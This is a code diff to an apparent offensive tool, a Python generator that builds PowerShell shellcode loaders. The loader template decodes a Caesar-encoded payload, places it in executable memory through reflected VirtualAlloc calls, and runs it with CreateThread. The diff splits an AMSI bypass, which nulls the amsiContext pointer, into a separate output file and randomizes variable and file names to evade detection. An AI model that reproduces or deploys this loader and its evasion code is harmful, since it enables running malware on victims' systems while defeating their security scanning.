@@ -729,13 +729,16 @@ function getDelegateType {
     $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $brax).SetImplementationFlags('Runtime, Managed')
     return $type.CreateType()
 }
-$aaaa=[Ref].Assembly.GetTypes();Foreach($bbbb in $aaaa) {if ($bbbb.Name -like "*iUt*") {$cccc=$bbbb}};$dddd=$cccc.GetFields('NonPublic,Static');Foreach($eeee in $dddd) {if ($eeee.Name -like "*Contex*") {$ffff=$eeee}};$gggg=$ffff.GetValue($null);[IntPtr]$myptr=$gggg;[Int32[]]$mybuffer = @(0);[System.Runtime.InteropServices.Marshal]::Copy($mybuffer, 0, $myptr, 1)
 $lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
 [Byte[]] $buf = %s
 for ($n=0;$n -le $buf.length-1;$n++) {$buf[$n] = ($buf[$n] - %s) -band 0xff}
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
 $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
 [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
+"""
+
+a_txt = """
+$aaaa=[Ref].Assembly.GetTypes();Foreach($bbbb in $aaaa) {if ($bbbb.Name -like "*iUt*") {$cccc=$bbbb}};$dddd=$cccc.GetFields('NonPublic,Static');Foreach($eeee in $dddd) {if ($eeee.Name -like "*Contex*") {$ffff=$eeee}};$gggg=$ffff.GetValue($null);[IntPtr]$myptr=$gggg;[Int32[]]$mybuffer = @(0);[System.Runtime.InteropServices.Marshal]::Copy($mybuffer, 0, $myptr, 1)
 """
 
 def rand_vars(source, *source_vars):
@@ -799,11 +802,14 @@ if args.type == "ps_template":
     c_key = 0x02
     p_shc = format_shellcode_caesar(plain_data, c_key)
     run_txt = PWSH_TEMPLATE % (p_shc, c_key)
-    run_txt = rand_vars(run_txt, "LookupFunc", "moduleName", "functionName", "assem", "tmp", "getDelegateType", "brax", "delType", "type", "lpMem", "buf", "hThread", "aaaa", "bbbb", "cccc", "dddd", "eeee", "ffff", "gggg", "mybuffer", "myptr")
+    run_txt = rand_vars(run_txt, "LookupFunc", "moduleName", "functionName", "assem", "tmp", "getDelegateType", "brax", "delType", "type", "lpMem", "buf", "hThread")
+    a_txt = rand_vars(a_txt, "aaaa", "bbbb", "cccc", "dddd", "eeee", "ffff", "gggg", "mybuffer", "myptr")
     
     if args.verbose:
         print(run_txt)
-    with open("run.txt", "w") as f_run: f_run.write(run_txt)
+    letters = string.ascii_letters
+    with open(f"{''.join(random.choice(letters) for i in range(random.randint(5,8)))}.txt", "w") as f_run: f_run.write(run_txt)
+    with open(f"{''.join(random.choice(letters) for i in range(random.randint(3,5)))}.txt", "w") as f_a: f_a.write(a_txt)
     exit(0)
 
 with open(input_filename, "rb") as file: data = file.read()
